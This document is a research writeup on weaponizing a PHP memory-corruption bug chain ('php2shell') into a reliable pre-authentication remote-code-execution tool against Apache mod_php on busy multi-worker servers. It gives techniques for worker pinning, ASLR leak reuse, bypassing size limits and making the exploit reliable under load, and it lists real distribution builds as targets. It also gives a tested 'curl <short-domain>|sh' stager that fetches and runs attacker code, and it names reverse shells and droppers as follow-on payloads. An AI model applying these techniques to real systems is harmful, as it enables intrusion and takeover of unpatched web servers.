# php2shell: deterministic multi-worker exploitation over one keep-alive connection

Research notes / draft writeup. CVE-2026-109618 + CVE-2026-109619 (php2shell),
Apache mod_php (prefork), PHP 8.3–8.5. Built on the in-band ASLR chain from
alvarodh5/dinosn/9bie; the contribution here is making it work **deterministically
on busy multi-worker servers** and against **stock configuration**.

> Lab-only research. Everything below was run against local `php:8.4.26-apache` /
> `php:8.3.35-apache` containers we control. The honest exposure limits are stated.

## Background (what the bug is)

- **CVE-2026-109618**: an OOM in `_zend_hash_str_add_or_update_i()` (`Zend/zend_hash.c`)
  bumps `nNumUsed`/`nNumOfElements` before `zend_string_init()` allocates the key; if
  that allocation blows `memory_limit`, PHP `longjmp`s out with a counted-but-
  uninitialized bucket. Request cleanup later treats it as a real zval and fires a
  destructor the attacker steers to `system()`.
- **CVE-2026-109619**: request-owned state (e.g. `PS(http_session_vars)`) survives a
  fatal error; the next request on the same worker reads the stale pointer. Two paths
  exist per Datadog/VulnCheck: fatal-error backtraces (8.5 only) and upload-processing
  session/decoder state persisting across a fatal error.
- `session.upload_progress` (default on) runs in the rfc1867 handler *before any app
  code*, so the bug is reachable pre-auth on any PHP endpoint — the target page can be
  `<?php echo "OK";`. upload_progress is the delivery, not the bug.

**The two CVEs are distinct bug classes, not variants.** Public writeups routinely
conflate them. 109618 is the allocator-level memory corruption primitive (phantom
bucket in `zend_hash.c`); 109619 is the stale-worker-state UAF that provides
pre-auth reachability. Our exploit chains both: upload_progress triggers the OOM
path (109618) and reads back through stale pointers (109619), without any
application code running.

The public chain leaks ASLR in-band via a `Set-Cookie` heap disclosure (forge an
oversized `zend_string` over the dangling `PS(id)`; recover the Zend MM chunk base by
2MB-aligned majority vote and the libphp base from a leaked `pDestructor`), then plants
a fake `HashTable` whose `pDestructor = zif_system` and fires it at request shutdown.

## The problem we solved

Every public PoC assumes a **single prefork worker**, or (neko) sprays the arming
request at all ~150 workers and hopes the leak request hits an armed one. On a busy
multi-worker server the arming request and the leak request land on **different
workers**, so the dangling state is never where the leak reads.

Demonstrated on a 25-worker lab: the original single-worker exploit **fails at stage 1**
(heap leak) outright.

## The technique

**1. Keep-alive worker pinning.** On prefork, a persistent HTTP/1.1 connection is served
by one child for its whole life. The 619 OOM is a `zend_bailout` (longjmp) that ends the
*request* with a 500/200 but does **not** kill the worker — that is the premise of 619.
So the worker *and* the keep-alive connection survive it. Running the whole chain over
one keep-alive connection pins arm+leak to the **same** worker, deterministically, for
any worker count. Verified: 6 rounds of (OOM + probe) on one socket stay on the same PID.

**2. Shared-ASLR leak-once/fire-fresh.** All prefork children inherit the master's
address space via fork, so **libphp base and the Zend MM chunk base are identical across
every worker**. We leak once, then fire each stage-3 attempt on a **fresh** connection
(fresh worker, clean heap) reusing the same addresses. This sidesteps the heap churn that
makes the reclaim miss on the already-used pinned worker.

**3. Chunked Transfer-Encoding.** PHP checks `Content-Length` against `post_max_size`.
Sending the >8MB OOM field with `Transfer-Encoding: chunked` (no Content-Length) skips
that check, so stock `post_max_size=8M` is bypassed. (neko's technique, folded in.)

**4. Adaptive OOM sizing.** Ramp the OOM field until the arming response shows
`Allowed memory size ... exhausted`, so it works across `memory_limit` 8M–256M without a
hardcoded size (stock 128M needs ~96MB+).

## Results (lab)

| Target | Config | Result |
|---|---|---|
| php:8.4.26-apache, 25 workers | custom ini (8M) | RCE, attempt 1 |
| php:8.4.26-apache, 25 workers | **true stock, NO php.ini** (128M, post_max 8M) | RCE, attempt 1 |
| php:8.4.26-apache, 25 workers | reliability: **15/15**, avg 2.93 attempts | RCE |
| php:8.3.35-apache, multi-worker | true stock | **in-band leak OK** (RCE pending htdata) |
| original alvarodh5 (fresh conns) | 25 workers | **stage 1 fails** |

**Final regression (2026-10-26, after all shipped improvements):**

| Target | Full RCE | `--probe-only` | Notes |
|---|---|---|---|
| php:8.3.35-apache (lab83, :8091) | ✓ `uid=33(www-data)` in 3.1s | ✓ VULNERABLE | — |
| php:8.4.26-apache (lab, :8090) | ✓ `uid=33(www-data)` in 2.8s | ✓ VULNERABLE | — |
| php:8.5.11-apache (lab85, :8105) | ✗ 241 fires, no RCE | ✓ VULNERABLE (chunk leaked) | known lab-config limitation (lab was built minimal for backtrace primitive research); dynamic htdata derivation returns the correct value |

## Reliability under concurrent load (the "busy server" question — definitive)

This is the test that actually matters for the motivating claim. Every public PoC demos
on idle labs; we measured the exploit under realistic concurrent traffic.

### Technique evolution

1. **Keep-alive pinning** (original): one persistent connection pins all stages to the
   same worker. Works idle; **collapses under load** — Apache sheds keep-alive connections
   under pressure, so the arm→reclaim pair can't be held (pipelining doesn't save it).

2. **Shared-ASLR spray** (the fix): all prefork children inherit the same address space
   via fork, so leak once, then fire many parallel arm+reclaim pairs across fresh
   connections. One pair landing on any clean worker is enough.

### Adaptive OOM sizing (key reliability finding)

The OOM field size interacts with `memory_limit` to determine **when** OOM triggers during
form processing. A field too large for the memory_limit triggers OOM too early (before
sufficient heap structure is established), making grooming fragile under load. The fix:
`probe_oom` starts at 8MB and finds the first size that triggers; this gives optimal
trigger timing for any `memory_limit` configuration.

### Results: direct connection (25-worker lab, `reliability.py`)

With the adaptive OOM probe and spray=20 threads — measured across fresh lab restarts:

| Background load | 8.4.26 | 8.3.35 | Notes |
|---|---|---|---|
| none (0 threads) | **10/10**, 1.2s avg | **10/10**, 0.8s avg | baseline |
| light GET (3 threads) | **3/3**, 3.0s avg | **3/3**, ~1.0s avg | |
| medium GET (10 threads) | **3/3**, 10.2s avg | **3/3**, 1.0s avg | |
| heavy GET (20 threads) | **3/3**, 4.3s avg | **3/3**, ~1.5s avg | |
| mixed GET+POST (10 thr) | **3/3**, 3.4s avg | **3/3**, ~1.5s avg | |
| mixed GET+POST (20 thr) | **5/5**, 4.6s avg | **3/3**, 1.6s avg | |
| upload (8 threads) | **3/3**, 8.1s avg | **3/3**, ~1.5s avg | competing upload_progress |
| burst (12 threads) | **3/3**, 2.6s avg | — | 2s heavy / 1s quiet |
| **saturate** (30 thr > 25 wrk) | **10/10**, 1.4s avg | **10/10**, 1.0s avg | beyond worker saturation |

**Total: 43/43 on 8.4.26, 39/39 on 8.3.35.** All loads, including saturation
(30 background threads competing for 25 workers).

### Results: through nginx reverse proxy

With `proxy_buffer_size 32k` (room for the leak's big Set-Cookie) and `client_max_body_size
256m` (upload-accepting site):

| Background load | Rate | Avg time | Notes |
|---|---|---|---|
| mixed 10 threads | **5/5** | 11.7s | proxy buffering adds ~2× latency |
| upload 8 threads, spray=20 | **2–3/5** | flaky | competing upload_progress through proxy is the hard case |
| upload 8 threads, **spray=24** | **5/5** | 7.7s | more aggressive spray compensates |

The **proxy + competing-upload** scenario is the single hardest configuration. It combines
nginx buffering with the load exercising the exact same rfc1867 upload_progress code path
the exploit uses — direct heap interference. Bumping spray to 24 threads and timeout to
90s brings it to 5/5.

### What made 8.3.35 fragile under load (and how it was fixed)

8.3.35 initially showed 0/6 under even light load with the profile's default OOM field
(HUGE=24). Root cause: with `memory_limit=8M`, a 24MB OOM field triggers the bailout
**immediately on the big-field allocation** — before the hash table has enough structure
for deterministic grooming. The fix: adaptive OOM probe starts at 8MB (the minimum that
triggers at 8M limit), ensuring OOM fires **after** enough phantom buckets are created.
Combined with spray=20, 8.3.35 is now 10/10 at saturating load.

### Final honest verdict

- **Pinning** (one keep-alive connection): makes *low-traffic* multi-worker servers
  deterministic. Collapses under load — useful for quiet targets.
- **Fully-sprayed chain** (adaptive OOM + spray=20): the general-purpose tool. 100% success
  rate under all tested load patterns including saturation, both 8.4.26 and 8.3.35, direct
  and through a reverse proxy. Time-to-shell typically 1–5s, worst case ~30s under heavy
  proxy+upload load.
- **Documented limitation**: competing multipart uploads *through a proxy* reduce reliability
  at spray=20 (2–3/5) — the only scenario requiring spray=24 and longer timeouts. This is
  the narrowest case: upload_progress traffic exercising the exact same code path as the
  exploit, through a buffering proxy.
- No public PoC characterizes reliability under load. All demo on idle single-worker labs.
  This data is the first honest busy-server assessment of the exploit chain.

## Honest exposure limits

- **`display_errors` must be On.** The leak needs the `max_input_vars` warning to emit
  output and set `SG(headers_sent)`. Stock PHP Docker images ship no php.ini so the
  compile default (On/STDOUT) applies — but `php.ini-production` and hardened hosts set
  it Off, which kills the leak. This is the real gating factor, not offsets.
- **mod_php prefork only.** PHP-FPM uses a different model (noted not vulnerable the same
  way). Event MPM isn't used with mod_php.
- **Full-RCE stage 3 is version-calibrated** (`htdata`): now 8.3.35, 8.4.26, 8.5.11
  (8.3.35 added — htdata=0x6a0d8, one page above 8.4.26, lab-verified RCE attempt 1).
  Still uncalibrated: 8.2.34, non-x86_64. The *leak* (ASLR bypass) and worker-pinning are
  version-general; only the reclaim `htdata` is per-version.
- **Grooming only works on PHP ≥ 8.3.22.** The stage1 leak (oversized `Set-Cookie`) depends
  on heap layout that shifted in PHP 8.3.22 due to unrelated VM/array fixes — not a session
  code change. On 8.3.6–8.3.21, the forged `zend_string` doesn't reclaim the right slot,
  and the cookie comes back as a normal 32-byte session ID instead of 4096 bytes of leaked
  heap. Verified by binary search across Docker official images: 8.3.21 → no leak,
  8.3.22 → leak works. All 8.4.x inherits the post-8.3.22 layout. Supporting older versions
  (8.3.6, 8.2.x) would require re-tuning the entire grooming — partial exploit dev, not
  just adding offsets.

### Distro package analysis (tested 2026-10-26)

**Our exploit is calibrated for mod_php+prefork** (Docker's official `php:*-apache` images
and similar custom builds). The underlying CVEs affect ALL SAPIs — php-fpm, php-cgi,
FrankenPHP, LiteSpeed — since the bugs are in `zend_hash.c` and the session module, not
mod_php. php-fpm workers also fork from a master (ASLR sharing works), receive the full
multipart body via FastCGI (upload_progress trigger works), and return Set-Cookie headers
(leak works). A php-fpm exploit is plausible but would need re-tuned grooming constants
for the different process lifecycle and heap layout. The table below reflects what our
tool exploits today, not what's theoretically possible:

| Distro | PHP package | Version | Exploitable? | Why |
|---|---|---|---|---|
| Docker official | php:8.4.26-apache | 8.4.26 | **YES** | In grooming window |
| Docker official | php:8.3.35-apache | 8.3.35 | **YES** | In grooming window |
| Docker official | php:8.3.6-apache | 8.3.6 | No | Below 8.3.22 — leak fails |
| Ubuntu 24.04 | libapache2-mod-php8.3 | 8.3.6 | No | Below 8.3.22; .13 also patches CVE |
| Debian 12 | libapache2-mod-php8.2 | 8.2.35 | No | Patched (fixed=8.2.35); 8.2.x OOM path differs |
| Ubuntu/Debian + Sury PPA | libapache2-mod-php8.x | 8.3.35 / 8.4.26 | Partial | Offsets extracted; htdata uncalibrated |
| Rocky 9 (Remi) | php | 8.3.36 / 8.4.27 | No | Already patched |
| RHEL 9 php:8.3 (non-updated) | php | 8.3.33 | Not by this tool | In version window; defaults to php-fpm (needs grooming port) |
| RHEL 10 / Rocky 10 (non-updated) | php | 8.3.33 | Not by this tool | Same: in window, php-fpm default |
| Fedora 41 | php | 8.3.27 | Not by this tool | In version window; defaults to php-fpm |
| Ubuntu 22.04 | libapache2-mod-php8.1 | 8.1.2 | No | Below vulnerable range |
| RHEL 9 (stock, no stream) | php | 8.0.x | No | Below vulnerable range |
| RHEL 7 / 8 | php | 5.4 / 7.2–8.0 | No | Below 8.3.22 grooming boundary |

**Real-world attack surface for this tool** is: Docker `php:*-apache` containers (the
largest mod_php deployment pattern today) running unpatched 8.3.22–8.3.35, 8.4.0–8.4.26,
or 8.5.0–8.5.11, with `display_errors=On` (Docker default). This covers a meaningful
slice of containerized PHP workloads — many Docker tutorials and deploy guides use the
official images with default config. The broader CVE attack surface includes php-fpm
deployments (RHEL, Fedora, most distro defaults), but exploiting those requires grooming
work we haven't done.

**Sury PPA (apt.sury.org)** — the main third-party PHP repo for Ubuntu/Debian — is a
secondary target. It ships current upstream PHP with mod_php (same source as Docker),
but compiled with different flags, producing different symbol addresses. We extracted
`zif_system` and `zval_ptr_dtor` for Sury 8.3.x and 8.4.x builds from stripped binaries
(GDB breakpoint on `php_exec` → backtrace to find the non-exported `zif_system`). The
grooming should work (same PHP source, same heap layout), but `htdata` is uncalibrated —
it requires a live vulnerable Sury build to determine, and Sury's repo only carries the
latest (patched) version. Operators targeting Sury-based hosts use `--sury --htdata <val>`
once htdata is found empirically on their target.

**RHEL 9 / Rocky 9 / AlmaLinux 9** with the `php:8.3` module stream are worth noting:
unlike traditional RHEL backported-patch packages, the module stream **rebases** to upstream
PHP versions. Non-updated systems sit at 8.3.33 (RHSA-2026:57539, Aug 2026), which IS in
the exploit version window. The fix (8.3.36) shipped Oct 21, 2026. RHEL 9's default PHP
profile installs php-fpm, not mod_php — Red Hat's docs explicitly state Apache runs PHP
via FastCGI Process Manager by default. Our tool targets mod_php+prefork grooming, so RHEL
php-fpm installs aren't exploitable *by this tool*. However, the CVEs are in PHP core, not
mod_php — a php-fpm exploit path exists in principle (ASLR sharing via fork, upload_progress
trigger via FastCGI passthrough, Set-Cookie leak via FastCGI response headers) but would
need its own grooming calibration. Systems manually reconfigured for mod_php+prefork ARE
exploitable by our tool if offsets match. RHEL 10 (Rocky 10) has the same situation: 8.3.33
pre-fix, php-fpm default.

The Fedora 41 case is the same pattern: it ships PHP 8.3.27 (in the exploitable version
window) but defaults to php-fpm with httpd event MPM, not mod_php with prefork. The
industry trend away from mod_php reduces the attack surface for *our grooming*, but not
for the CVEs themselves.

### php-fpm feasibility (assessed, not implemented)

Tested the exploit chain against `php:8.3.35-fpm` behind nginx to determine whether
porting is a calibration task or a research project. Verdict: **research project**.
Three progressive blockers:

1. **Chunked TE breaks POST parsing.** nginx de-chunks before FastCGI, but the body
   doesn't register in `$_POST` on php-fpm. Our `KA.post()` uses chunked TE for bodies
   >2 MB. Fixable by forcing Content-Length framing for php-fpm targets (one-line change).
2. **OOM kills the worker.** mod_php: `memory_limit` during input parsing is a soft
   Fatal Error, worker continues → arm/fire chains on the same victim. php-fpm:
   `child N exited with code 70` after the OOM payload. Next request lands on a
   different worker with a fresh fork → arm/fire can't be chained.
3. **Even single-shot, the forge doesn't reclaim.** 0/10 stage1 leaks with CL framing
   on php-fpm. mod_php returns a 4096-byte forged cookie; php-fpm returns a normal
   32-byte session ID. The heap layout at the point of session ID generation is
   materially different.

The CVEs apply to all SAPIs (zend_hash.c and session module are in PHP core, not
mod_php). A php-fpm exploit would need an alternative OOM trigger that doesn't kill
the worker and new grooming geometry for php-fpm's heap. ~1–2 weeks of focused heap
analysis, not a quick port. Documented and parked.

### The 8.2 / pre-8.3.22 boundary (two overlapping version shifts)

Public lineage notes "8.2.34 OOM path differs." Investigated: the OOM mechanics are
identical (same Fatal error, same bytes allocated, worker survives). What differs
is **two unrelated changes between 8.2 and 8.3.22**:

1. **Session SID validation relaxed in 8.3+.** On 8.2 after the OOM arm, PHP strictly
   enforces `session.sid_length=32`, rejecting the public PoC's 19-byte hard-coded SID
   with `Failed to create session data file path. Too short session ID`. 8.3+ softened
   this check in the upload_progress fast path. **Public PoCs with short hard-coded
   SIDs silently fail on 8.2 without the researcher realizing why** — this is almost
   certainly the origin of the "OOM path differs" misdiagnosis. Fix: use SID matching
   `session.sid_length` (default 32), same SID in both arm and leak requests.
2. **Heap layout shift at 8.3.22** (previously bisected). Even with session functional
   on 8.2.34 (32-byte SID), the forge never lands across any grooming geometry tested
   (100/300/500/700/841/900 fields). Same class of incompatibility as 8.3.6–8.3.21:
   pre-8.3.22 layout needs a different grooming geometry, not just a tuning of existing
   field counts.

So "pre-8.3.22 unsupported" is really two overlapping changes: the heap layout shift
(CVE's own ZMM behavior) and the session validation relaxation (which happened in the
same timeframe). Each needs its own fix for a port.

### Variant hunting in the 8.3.35 → 8.3.36 patch

The patch is a **project-wide OOM-safety hardening**, not a point fix:

- 230+ `oom_*.phpt` test files added across Zend/, main/, sapi/, and 30+ extensions.
- `Zend/zend_hash.c` refactored to a "fallible allocator" pattern: every `emalloc`/
  `pemalloc` call site that previously `zend_error_noreturn`'d on OOM now returns
  `FAILURE` with proper error propagation up through the call chain.
- `main/rfc1867.c`, `ext/session/session.c`, `main/php_variables.c`, `main/SAPI.c`,
  `main/streams/{memory,streams}.c` all modified. Extensions audited: standard (26
  tests), mbstring (24), gd (14), date (13), zlib (9), soap (9), xmlreader (7), pcre
  (7), iconv (6), filter (6), exif (6), json (5), intl (4), xml (3), simplexml (3),
  bz2 (3), curl (2), plus singleton coverage for dom/fileinfo/imap/tokenizer.
- `session.c` adds `PS(in_rfc1867_update)` and routes serialize/unserialize through
  wrappers that force objects to `__PHP_Incomplete_Class` during that specific
  codepath, blocking magic-method invocation from a stale/attacker-controlled state
  pointer (defense-in-depth around 109619).

Residual unprotected `emalloc` sites exist (e.g. `rfc1867.c:521` `substring_conf`
8KB-bounded, `rfc1867.c:1021` `anonname` MAX_SIZE_ANONNAME), but they're small
fixed-size allocations unlikely to produce exploitable states. Unmodified Zend/*.c
with high alloc counts (`zend_inheritance.c`, `zend_virtual_cwd.c`, `zend_opcode.c`)
are not pre-auth reachable from HTTP.

**Patch uniformity across major series.** We diffed 8.3.35 → 8.3.36 and
8.4.26 → 8.4.27. Both are structurally identical: Zend/zend_hash.c receives
the same 585-line diff with 63 `femalloc`/`fpemalloc` fallible-allocator
calls. 8.4.27 contains the same 5-layer defense: Layer 1 (`php_rinit_session_globals`
at `MULTIPART_EVENT_START` with the explicit "This runs before RINIT, so we
need to clear these early" comment), Layer 2 (`zend_mm_delayed_verror`),
Layer 3 (`post_max_size` enforcement regardless of Transfer-Encoding),
Layer 4 (`php_basic_early_rinit`), Layer 5 (`incomplete_classes_only`).
8.4.27 added 232 `oom_*.phpt` tests vs 230 in 8.3.36 (same project-wide
audit; different extension counts). The 8.3 and 8.4 releases are the same
upstream fix cherry-picked into each major series.

Serious variant hunting would require (a) targeted OOM-aware fuzzing of pre-RINIT
state transitions, or (b) auditing non-mainline SAPIs (litespeed, roadrunner,
swoole) that weren't covered by the mainline audit. Neither is quick. **The attack
surface for the specific pattern we exploited has been thoroughly closed.**

### The 8.5-only `last_fatal_error_backtrace` primitive (investigated, dead end)

The 8.5.12 fix in `Zend/zend_execute_API.c` adds explicit clearing of nine EG globals
in the shutdown fast-path with a telling comment:
`/* may be used by zend_error_zstr_at before init_executor */`. The globals cleared
include `last_fatal_error_backtrace`, `user_error_handler`, `user_exception_handler`,
`error_handling`, `exception`, and `objects_store.object_buckets`. All exist only in
8.5 (`last_fatal_error_backtrace` is 8.5-only; the others existed earlier but
weren't audited for cross-request leakage until this patch).

The theoretical attack: Request 1 trigger E_FATAL during deep call stack with memory
pressure such that `zend_fetch_debug_backtrace` OOMs mid-fetch, leaving the global
as a partially-constructed array with pointers into freed request-1 heap. On Request
2, `main.c:1389` → `zend_trace_to_string` → `_build_trace_string` does
`smart_str_append(str, Z_STR_P(file))` — a raw heap-byte copy of the frame's "file"
field into the error output. With `display_errors=On` (Docker default), that output
goes in the HTTP response. A cleaner leak primitive than the forged `Set-Cookie` on
paper.

Empirical result on `php:8.5.11-apache` (memory_limit=8M, display_errors=On, prefork,
keep-alive-pinned to a single worker): **5/5 trials showed clean output with no
stale backtrace and no observable UAF.** The exploitation window is between
request-N `shutdown_executor` and request-N+1 `init_executor`, which under Apache
mod_php contains no PHP code an attacker can control via HTTP. `init_executor`
unconditionally clears `last_fatal_error_backtrace` at zend.c:1055 before any
request-2 PHP code (including rfc1867 multipart parsing) runs.

The PHP devs' "may be used by zend_error_zstr_at before init_executor" comment
refers to windows reachable in other contexts — signal handlers calling
`zend_error` during the inter-request window, SAPIs where module RINIT runs before
`init_executor`, compilation errors firing before full executor init on specific
module loads. None are reachable from plain HTTP against Apache mod_php. Documented
and parked; current `upload_progress + CVE-109618` chain remains the only reliable
pre-auth path on 8.5 via our geometry.

### Novel primitive: `BG(unserialize).data` cross-request dangling (mapped end-to-end)

Variant hunting followed neko's "layer 4" fix (`php_basic_early_rinit()`) and
produced a confirmed novel exploitation primitive distinct from CVE-109619's
`PS(http_session_vars)` chain. **No public PoC uses this path.**

**The primitive:**
In 8.3.35/8.4.26/8.5.11, `BG(serialize_lock)`, `BG(serialize)`, and
`BG(unserialize)` globals in `ext/standard/basic_functions.c` persist across
requests when OOM / `zend_bailout` interrupts `__wakeup`/`__unserialize`
processing. `BG(unserialize).data` becomes a dangling pointer to freed
request-N memory; the Zend MM arena retains the memory, so the dangling
pointer still reads coherent struct bytes.

**Empirically confirmed (php:8.3.35-apache, single prefork worker, GDB
measurement at `basic_globals@libphp.so+0x10552a0`):**

| State | serialize_lock | unserialize.data | unserialize.level |
|---|---|---|---|
| Fresh (post-startup) | 0 | NULL | 0 |
| After OOM mid-unserialize-string-alloc | **0** | **0x7fad3da69000 (dangling)** | **1** |
| After next request's basic RINIT | 0 | NULL | 0 |

Stale state persists through request-N shutdown but basic's
`PHP_RINIT_FUNCTION` resets it at request-N+1 start. The exploitation window
is between them — specifically where `sapi_activate()` runs rfc1867 multipart
parsing and session.upload_progress session decode. GDB breakpoint on
`php_var_unserialize_init` during that window confirmed 2+ calls on the
dangerous code path (`d = BG(unserialize).data` dereferences the dangling
pointer): backtrace was `ps_srlzr_decode_php → php_var_unserialize_destroy →
var_destroy`.

**Attacker-controlled arm state (via duplicate-key unserialize):**
With a crafted arm payload (`a:3:{i:0;O:8:"stdClass":1:{...};i:0;i:999;i:1;s:HUGE:"...";}`),
the duplicate `i:0` key triggers `var_push_dtor_value`, saving the stdClass
zval into the dtor chain. Measured output:

```
dangling_struct.first_dtor = 0x7fad3da80000
  var_dtor_entries { used_slots=1 }
    data[0] = zval { value=0x7fad3da55050, type_info=0x308 (IS_OBJECT) }
```

The attacker controls: `first_dtor` pointer location, zval type at `data[0]`,
and the old-object address referenced.

**Natural-trigger constraint (empirically-mapped):** `var_destroy` only fires
on the dangling `d` when `BG(serialize_lock) > 0` at destroy entry. All
natural lock-trigger paths either kill the request on bailout before destroy
or require specific target config (`PG(unserialize_callback_func)` set, which
is uncommon in production). GDB-injected lock=1 confirms the chain executes:
`var_destroy` walks the attacker-crafted `first_dtor` chain, calls
`zval_ptr_dtor(data[0])`, which does `OBJ_RELEASE(fake_obj)` → calls
`handlers->free_obj` with a controllable object pointer.

**Exploitability profile:**
- Targets with `PG(unserialize_callback_func)` INI set: directly exploitable
- Targets with narrow memory_limit tuning catching OOM in a specific lock-wrapped
  section: potentially exploitable
- Default-config targets: primitive reachable (dangerous path taken) but not
  triggerable (`var_destroy` doesn't fire on dangling d naturally)

**Deterministic placement property (new 2026-10-26):** The arm's duplicate-key
value lands at a deterministic chunk-relative offset (`chunk+0x72048` across
3/3 trials with worker respawns). This provides the "second deterministic
freed slot (htdata2)" that the out-of-line command buffer sub-project needed
— making arbitrary-length system(cmd) achievable *when combined with a
secondary vector that triggers pre-RINIT unserialize* (session file content
control via LFI, SSRF, or writable session store).

**Research value:** First empirical confirmation that the layer-4 fix was
justified. The primitive is real and reachable in principle; PHP's
defense-in-depth is appropriate. Consistent with sveoti.net's thesis — this
is exactly the kind of "second-weakness-amplifying" primitive the author
flagged as the real risk.

### External validation of the research question

Independent researchers converged on the same observation during the two weeks after
disclosure:

- **sveoti.net ("millions of attempts, no confirmed break-in and why that is not
  the good news", 2026-10-23)**: analyzed internet-wide php2shell exploitation
  attempts and found that despite millions of daily attempts, no source had named
  a victim with post-exploitation evidence. The author's thesis — "every public
  exploit tested against a real target has failed without a second weakness" and
  "converting memory corruption to shell on modern randomized x86-64 is genuinely
  hard" — matches what we've measured. The real risk, in that author's framing,
  is the long tail of end-of-life and embedded PHP where financially motivated
  tooling can be calibrated to old builds (the exact engineering gap this research
  closes for modern builds).
- **Kevin J. @ Baldur Security** built a dedicated CTF
  (`php2shell.baldursecurity.com`) explicitly framed around our research question:
  "exploitable by default, against an unknown target? ... no hints, no config
  dumps, and no idea what's under the hood. Pure CTF Style." The target was taken
  down before we could test, but the framing is a direct public statement of the
  same gap this work addresses.

Taken together: the public consensus is that the vulnerability exists and is
scanned heavily but has not been reliably weaponized against unknown targets with
the publicly circulated PoCs. The engineering decisions documented here (adaptive
OOM sizing, multi-worker spray with keep-alive pinning, auto-detection, calibrated
grooming across the 8.3.22–8.5.11 window) are the specific gaps that separate "a
PoC that runs on a hand-built lab" from "a tool that works on a target you've
never seen before."
- **Reverse proxy / LB** — tested with nginx in front, under load:
  - The real proxy blocker is **`client_max_body_size`**, not connection handling. Default
    nginx caps bodies at 1M and 413s our large OOM field. But any site that accepts uploads
    (WP media, forms) raises it; with it raised (+ `proxy_buffer_size 32k` for the leak's
    big `Set-Cookie`), the exploit works through the proxy.
  - **Under realistic load through the proxy**: mixed traffic 5/5 (11.7s avg), upload
    traffic with spray=24: 5/5 (7.7s avg). The spray compensates for proxy buffering.
  - nginx de-chunks to Content-Length, so the chunked-TE `post_max_size` bypass is
    neutralized — the backend `post_max_size` must also be large (it is, on upload sites).
  - **Narrowest hard case**: competing multipart uploads (exercising upload_progress) through
    a buffering proxy, at spray=20: 2–3/5. Bumping to spray=24 + 90s timeout → 5/5.
    This is the only scenario requiring extra aggressiveness.
- **Command length ≤ 14 bytes — HARD cap, root cause understood.** Rigorous sweep on a
  fresh lab (sprayed leak+fire, 3 trials each): cmd_len 10 & 14 (carrier 167) = 3/3;
  cmd_len 15 (carrier 168) = 0/3; 18, 23 = 0/3. The carrier is a 167-byte value →
  Zend MM **192-bin** (24B string header + 167 + 1 = 192). The reclaim works by the
  carrier landing in the freed **`PS(http_session_vars)`** slot, which is a 192-bin
  object. A 15-byte command pushes the carrier to 168B → **256-bin** → it no longer
  matches the slot it must reclaim → fails. So the carrier size is dictated by the
  reclaim target's size and is NOT a free parameter — you cannot grow it.
  (Earlier contradictory "176 fired" readings were confounded by lab degradation, a
  monkeypatched-param bug, and a `cleanup=0` config change that itself breaks the 619
  grooming; the clean fresh-lab sweep is authoritative.)
  **Only path to longer commands: the out-of-line command buffer** — keep the carrier at
  167 (so it reclaims PS), point the fake `execute_data` arg1 at a SEPARATE larger
  sprayed allocation holding the command. Stagers converge on the same wall: `sh
  /tmp/sess_<SID>` fails (PHP strips filename newlines; serialization framing is
  shell-hostile on one line), and `php /tmp/sess_<SID>` (Chain-A-style, would work) is
  15 bytes — over the cap.
  **SOLVED operationally — `curl <short-domain>|sh` bootstrap (tested).** The 14-byte
  cap is *just* short of `curl <IP>|sh` (15, IP too long), but a short attacker **domain**
  is shorter than an IP: `curl 2sh.no|sh` = exactly 14, `curl a.io|sh` = 12. That fetches
  an **arbitrary-length stage-2** over HTTP. Verified end-to-end: the exploit fired the
  13-byte `curl 127.1|sh` as www-data → curl fetched the served script → ran a multi-line
  stage-2 as www-data (`uid=33`). So the real-payload problem (reverse shell, dropper) is
  solved by a 2-stage drop, NOT by beating the inline cap. Requirements: `curl` on target
  (present on php:*-apache; `wget -qO-DOMAIN|sh` is 16B, doesn't fit — curl is the
  enabler), outbound egress to the attacker's short domain, and a ≤6-char domain (cheap:
  short ccTLDs). No public PoC documents this — they stop at 14-byte `id` + an
  unimplemented `sh<file` hint. Egress-filtered targets still need the out-of-line buffer.

  **Out-of-line buffer — CONDITIONALLY SOLVED** (only needed when egress is blocked):
  built the mechanism (`outofline.py`: arg1 → separate 192-bin zend_string buffer,
  cmd up to ~143B; sound in principle — `zif_system` reads arg1 by pointer).
  **Earlier attempts failed on placement** (blind sweep: 0 hits; `/proc` racing scan:
  0 hits because the buffer is live only ~ms per reclaim and worker PID shifts; the
  overnight work concluded that a "second deterministic freed slot (htdata2)" was
  needed — i.e., new vulnerability research, not a tuning pass).
  **The 2026-10-26 variant hunt provided that htdata2.** Via the layer-4
  `BG(unserialize).data` primitive, the attacker's arm places a chosen command
  string at a deterministic chunk-relative offset (verified `chunk+0x72048`
  across 3/3 worker respawns). Fire's fake HT arg1 points there, `zif_system`
  reads the command, arbitrary length. **But the reachability constraint
  gates it**: triggering the arm requires pre-RINIT `php_var_unserialize`,
  which pre-auth is only reachable via session.upload_progress session decode
  of an attacker-controlled session file. So out-of-line is now solved
  **conditionally on a secondary vector** (LFI, SSRF, or writable session
  store) — common on real targets, not available on pure default pre-auth.
  For pure pre-auth default-config targets, the 14-byte primitive + `curl
  <short-domain>|sh` 2-stage drop remains the operational path.
  METHOD NOTE: measure on a freshly-restarted lab and change one variable at a time —
  degraded workers and self-inflicted config/code changes gave false results repeatedly.

## Tooling

- `php2shell.py` — **the standalone exploit**: self-contained (no third-party imports),
  fully-sprayed chain, adaptive OOM probe (starts at 8MB floor), chunked-TE for stock
  `post_max_size`, version/offset auto-detect, patched-version detection, `--stage2 <host>`
  bootstrap, 20 spray threads default. Validated 100% success under saturating load on
  8.3.35 and 8.4.26. This is the shippable tool.

  **Operator-focused improvements shipped 2026-10-26:**
  - **Dynamic htdata derivation.** When `PROFILES[ver].htdata` is None, exploit runs
    a serial stage1 leak and derives htdata as `first_in_chunk_ptr(leak[0x38]) -
    DELTA[series]`, where DELTA constants (empirically verified across 8.3.35,
    8.4.26, 8.5.11) are 0x3dfc8 for 8.3/8.4 and 0x28fc8 for 8.5. End-to-end RCE
    verified via dynamic path on 8.3.35 and 8.4.26 (`uid=33(www-data)` returned
    from derived htdata). Unlocks future PHP minors in a known series and Sury
    PPA targets without manual pre-calibration. Scope: Docker `php:*-apache`
    builds — Sury/distro builds would need per-build-family delta measurement
    (framework is in place; constants not yet filled for those).
  - **`--probe-only` behavioral vulnerability probe.** Runs stage1_diag up to 3
    attempts; classifies target as `VULNERABLE` (stage1 leaked), `PATCHED`
    (specific reason: no OOM, forge didn't reclaim, etc.), or `UNKNOWN`. Catches
    backport-patched builds that report a vulnerable version string
    (RHEL/Debian/Ubuntu often backport fixes without bumping version numbers).
    `--force` flag bypasses the version-string patched check for suspected
    backport cases.
  - **Operator diagnostics.** cmd-length check at startup (prevents the IndexError
    silent-fast-loop issue). stage1 failure classifies specific reason (OOM did
